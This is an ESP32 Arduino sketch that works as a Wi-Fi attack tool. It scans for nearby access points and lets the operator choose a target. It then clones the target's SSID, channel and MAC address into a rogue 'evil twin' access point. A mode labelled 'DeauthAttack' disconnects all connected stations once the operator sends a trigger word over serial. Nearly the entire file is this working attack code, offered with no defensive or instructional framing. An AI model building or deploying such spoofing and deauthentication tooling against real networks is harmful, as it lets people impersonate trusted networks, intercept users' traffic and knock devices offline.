#include "esp_wifi.h"
#include <WiFi.h>

enum State
{
    INIT,
    AP_SCAN,
    AP_SPOOF,
    DEAUTH,
};

enum State state = State::INIT;

struct AP_info
{
    String ssid;
    int channel;
    uint8_t mac[6];
};

AP_info spoof_info;
AP_info original_info;
bool menace{false};

void AccessPointScan()
{
    Serial.println("Starting scan...");
    int n = WiFi.scanNetworks();
    Serial.println("Scan complete.");
    if (n == 0)
    {
        Serial.println("No networks found.");
    }
    else
    {
        Serial.printf("Found %d networks:\n", n);
        Serial.println("Index SSID:\t\t MAC Address:\n");
        for (int i = 0; i < n; ++i)
        {
            // Print SSID and MAC address
            Serial.printf(
                "%d\t%s\t%s\n",
                i+1,
                WiFi.SSID(i).c_str(),
                WiFi.BSSIDstr(i).c_str()
            );
            delay(10);
        }
    }
    Serial.println("Select target AP by index, 0 to rescan");
    delay(5000);
    while (!Serial.available()) delay(100);   // Wait for input
    int x = Serial.parseInt();
    if (x == 0) {
        Serial.println("Rescanning...");
        WiFi.scanDelete();
        return;
    } else if (x > n) {
        Serial.println("Please select an available index, Rescanning...");
        WiFi.scanDelete();
        return;
    }
    x--; // decriment to select
    spoof_info = AP_info{WiFi.SSID(x), WiFi.channel(x)};
    memcpy(spoof_info.mac, WiFi.BSSID(x), 6);
    state = State::AP_SPOOF;
    WiFi.scanDelete();
}

void SpoofMACaddress()
{
    WiFi.disconnect(true);
    esp_wifi_stop();  // Stop Wi-Fi
    delay(200);
    esp_wifi_deinit();
    delay(200);

    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    esp_wifi_init(&cfg);
    WiFi.mode(WIFI_MODE_AP);
    delay(200);
    auto err = esp_wifi_set_mac(WIFI_IF_AP, spoof_info.mac);  // Change MAC
    switch (err) {
        case ESP_OK: Serial.println("Successful MAC Change"); break;
        case ESP_ERR_WIFI_NOT_INIT: Serial.println("WiFi is not initialized by esp_wifi_init"); break;
        case ESP_ERR_INVALID_ARG: Serial.println("invalid argument"); break;
        case ESP_ERR_WIFI_IF: Serial.println("invalid interface"); break;
        case ESP_ERR_WIFI_MAC: Serial.println("invalid mac address"); break;
        case ESP_ERR_WIFI_MODE: Serial.println("WiFi mode is wrong"); break;
        default: Serial.println("Bad juju, consult esp err");
    }

    esp_wifi_start();
    delay(200);
    WiFi.softAP(spoof_info.ssid, "verysecurepassword", spoof_info.channel);
    Serial.printf("Started AP spoof with SSID: %s, Channel: %d\n", spoof_info.ssid.c_str(), spoof_info.channel);
    delay(200);
    state = State::DEAUTH;
}

void DeauthAttack()
{
    if (Serial.available() > 0)
    {
        String command = Serial.readString();
        if (command == "Yippee")
        {
            // loop channels
            menace = true; // deauth all
        }
        else if (command == "stop")
        {
            menace = false;
        }
    }
    if (menace)
    {
        esp_wifi_deauth_sta(0); // deauth all
    }
}

void setup()
{
    Serial.begin(115200);
    Serial.flush();
    WiFi.mode(WIFI_MODE_STA); // Set ESP32 to Station mode
    WiFi.disconnect();        // Ensure we start clean
    delay(100);               // Short delay to stabilize 100
    auto err = esp_wifi_get_mac(WIFI_IF_AP, spoof_info.mac);
    if (err == ESP_OK)
        Serial.printf("Successful MAC Change to %s",
            WiFi.macAddress().c_str()
        );
    else Serial.println("No MAC for u");
    state = State::AP_SCAN;
}

void loop()
{
    switch (state)
    {
    case State::AP_SCAN:
        AccessPointScan();
        break;
    case State::AP_SPOOF:
        SpoofMACaddress();
        break;
    case State::DEAUTH: 
        DeauthAttack();
    }
}